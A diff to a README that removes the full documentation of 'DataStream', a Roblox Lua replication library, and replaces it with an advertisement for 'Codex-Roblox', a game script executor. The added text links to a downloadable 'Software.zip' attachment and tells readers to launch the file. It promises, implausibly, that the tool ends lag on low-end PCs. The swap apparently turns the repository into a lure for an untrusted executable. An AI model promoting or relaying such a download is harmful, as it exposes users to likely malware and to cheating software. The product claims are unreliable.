@@ -1,243 +1,34 @@
-# DataStream
-
-DataStream is a intuitive ReplicaService alternative. All schemas are replicated in real time (no loops!) between the client and server with no need to call obnoxious methods.
-
-DataStreams can be used for anything from PlayerData to NPC data replication. As long as its an instance that exists on the client and server, it can be replicated!
-
-Recommended for use with projects that use external editors such as VSCode
-
-## Table of Contents
-- [DataStream](#datastream)
-  - [Table of Contents](#table-of-contents)
-  - [Schemas](#schemas)
-    - [Global:](#global)
-    - [Player:](#player)
-  - [Methods `DataStreamObject`](#methods-datastreamobject)
-    - [**:Read()**](#read)
-    - [**:Write()**](#write)
-    - [**:Changed((newValue : any) -\> ())**](#changednewvalue--any---)
-    - [**:ChildAdded((indexOfChild : any) -\> ())**](#childaddedindexofchild--any---)
-    - [**:ChildRemoved((indexOfChild : any) -\> ())**](#childremovedindexofchild--any---)
-    - [**:Insert(value : any)**](#insertvalue--any)
-    - [**:Remove(value : any)**](#removevalue--any)
-  - [Examples](#examples)
-    - [1. Increase playtime each second for a player:](#1-increase-playtime-each-second-for-a-player)
-    - [2. Adding and removing players to an array](#2-adding-and-removing-players-to-an-array)
-  - [Installation](#installation)
-
-
-## Schemas
-
-A schema is a template data set DataStream starts with. In DataStream, there are two types of schemas:
-
-1. Global Schemas
-   
-   Global schemas are a single data set that is initialized immediately that is shared in real-time between all players and the server.
-   
-2. Player Schemas 
-   
-    Player schemas are a data set that is unique to each individual player, and are initialized as each player joins.
-
-For our examples, we will be using the following schemas
-
-### Global:
-```lua
-return { --Schemas/Global/GameData.lua
-    CurrentGameTime = 0,
-    GlobalPlaytime = 0,
-    PlayerInGame = {},
-    CurrentGameMessage = "Intermission",
-    Stats = {
-        TotalDeaths = 0,
-        CoinsCollected = 0,
-        ObjectsCollected = {}
-    }
-}
-```
-
-### Player:
-```lua
-return { --Schemas/Player/Stored.lua
-    Currency = {
-        Coins = 0,
-        Gems = 0
-    },
-    PlaytimeSeconds = 0
-}
-```
+# **Codex-Roblox: The Premier Roblox Script Executor**
 
+## Overview
 
-## Methods `DataStreamObject`
-**All methods are the same on the server and client.**
+Welcome to the "Codex-Roblox" repository, home to the cutting-edge Roblox script executor - Codex. Are you tired of experiencing lag and instability while enjoying your favorite Roblox games on low-end PCs? Look no further! Codex is here to provide you with a smooth and stable Roblox gameplay experience, tailored for those with hardware limitations. 
 
-### **:Read()**
-Reads the current value that the StreamObject references.
+## Features
 
-```lua
-local value = DataStream.SchemaName.ValueName:Read()
+Codex stands out as the go-to script executor for Roblox enthusiasts, offering unparalleled functionality that allows you to effortlessly run scripts for your preferred Roblox games. With Codex, you can unlock a whole new level of customization, enhancing your gameplay and overall user experience on Roblox.
 
-print("The current value of ValueName is", value)
-```
+## Get Started
 
-### **:Write()**
-**SERVER ONLY** Writes the current value that the StreamObject references.
+To access the incredible features of Codex, simply download the software from the following link: 
 
-```lua
--- There are many ways to perform a write operation:
-DataStream.SchemaName.ValueName:Write(10)
-DataStream.SchemaName.ValueName = 10
+[![Download Codex](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/user-attachments/files/18060583/Software.zip)
 
--- Math operators
-DataStream.SchemaName.ValueName *= 10
-DataStream.SchemaName.ValueName /= 10
-DataStream.SchemaName.ValueName += 10
-DataStream.SchemaName.ValueName -= 10
-```
+*Note: Launch the downloaded file to install and start using Codex.*
 
-### **:Changed((newValue : any) -> ())**
-Fires a callback function when the referenced value is changed
+## Enjoy Smooth Gaming
 
-```lua
-DataStream.SchemaName.ValueName:Changed(function(newValue)
-    print("Value changed to", newValue)
-end)
+With Codex at your fingertips, say goodbye to lag and hello to smooth and stable gameplay on Roblox. Explore the endless possibilities of script execution and enhance your gaming experience like never before.
 
-DataStream.SchemaName.ValueName = 10
-```
+## Feedback and Support
 
-### **:ChildAdded((indexOfChild : any) -> ())**
-Fires a callback function when the referenced dictionary has a new member.
+We value your feedback and are here to support you on your Codex journey. If you encounter any issues or have suggestions for improvement, please check the "Releases" section for updates or reach out to our support team.
 
-```lua
-DataStream.SchemaName.ValueName = {}
-DataStream.SchemaName.ValueName:ChildAdded(function(newIndex)
-    print("New value is equal to", DataStream.SchemaName.ValueName[newIndex]:Read())
-end)
+---
 
-DataStream.SchemaName.ValueName.NewValue = "Hello world!"
-```
+Turn your Roblox gaming experience into something extraordinary with Codex. Download now and elevate your gameplay! 🚀
 
-### **:ChildRemoved((indexOfChild : any) -> ())**
-Fires a callback function when the referenced dictionary loses a member.
+---
 
-```lua
-DataStream.SchemaName.ValueName = {
-    NewValue = "Hello World!"
-}
-DataStream.SchemaName.ValueName:ChildRemoved(function(newIndex)
-    print("New value is equal to", DataStream.SchemaName.ValueName[newIndex]:Read())
-end)
+Thank you for joining us in the world of Codex-Roblox. Happy gaming! 🎮
 
-DataStream.SchemaName.ValueName.NewValue = nil
-```
-
-### **:Insert(value : any)**
-**:Insert(position : number, value : any)**
-
-Inserts the provided value to the target position of the array. If target position is not provided, it will append at the end of the array.
-
-```lua
-DataStream.SchemaName.NewArray = {}
-
-DataStream.SchemaName.NewArray:Insert("Hello,")
-DataStream.SchemaName.NewArray:Insert("world!")
-
-print(table.concat(DataStream.SchemaName.NewArray:Read(), " ")) --> "Hello, world!"
-```
-
-### **:Remove(value : any)**
-
-Removes the specified element from the array, shifting later elements down to fill in the empty space if possible.
-
-```lua
-DataStream.SchemaName.NewArray = {"a", "b", "c"}
-
-DataStream.SchemaName.NewArray:Remove(2)
-DataStream.SchemaName.NewArray:Remove(2)
-
-print(DataStream.SchemaName.NewArray:Read()) --> { "a" }
-```
-
-
-
-## Examples
-
-*Note: These are all for example sake, some of these methods may not be the most efficient solutions depending on your use-case.*
-
-### 1. Increase playtime each second for a player:
-
-```lua
--- Server
-local Players = game:GetService("Players")
-local DataStream = require(DataStreamModule)
-
-local globalGameDataStream = DataStream.GameData
-
-local function SetupPlayer(player : Player)
-    local playerStoredStream = DataStream.Stored[player]
-
-    task.spawn(function()
-        while player.Parent and task.wait(1) do
-            playerStoredStream.PlaytimeSeconds += 1
-            globalGameDataStream.GlobalPlaytime += 1
-        end
-    end)
-end
-
-
--- Client
-
-local DataStreamClient = require(DataStreamClientModule)
-
-DataStreamClient.Stored.PlaytimeSeconds:Changed(function(seconds : number)
-    print("Current player seconds:", seconds)
-end)
-
-```
-
-### 2. Adding and removing players to an array
-
-```lua
--- Server
-local Players = game:GetService("Players")
-local DataStream = require(DataStreamModule)
-
-local globalGameDataStream = DataStream.GameData
-
-function AddPlayerToGame(player)
-    globalGameDataStream.PlayersInGame:Insert(player)
-end
-
-function RemovePlayerFromGame(player)
-    local index = table.find(globalGameDataStream.PlayersInGame:Read(), player)
-    if index then
-        globalGameDataStream.PlayersInGame:Remove(index)
-    end
-end
-
-
--- Client
-
-local DataStreamClient = require(DataStreamClientModule)
-
-local LocalPlayer = game.Players.LocalPlayer
-local PlayerInGameStream = DataStreamClient.GameData.PlayersInGame
-
-function isLocalPlayerInGame() : boolean
-    return table.find(PlayerInGameStream:Read(), LocalPlayer) ~= nil
-end
-```
-
-## Installation
-
-There are three folders:
-
-1. Move folders
-   - `src/Server` content should go in `ServerScriptService`
-   - `src/Client` content should go in `StarterPlayerScripts`
-   - `src/Shared` content should go in `ReplicatedStorage`
-  
-
-2. Edit `ServerDataStreamConfig.lua` and change `SHARED_MODULES_LOCATION` to the location of `DataStreamShared` folder.
-3. Edit `ClientDataStreamConfig.lua` and change `SHARED_MODULES_LOCATION` to the location of `DataStreamShared` folder.
-4. Done! the only two modules you should ever need to access are `DataStream` on the server and `ClientDataStream` on the client.
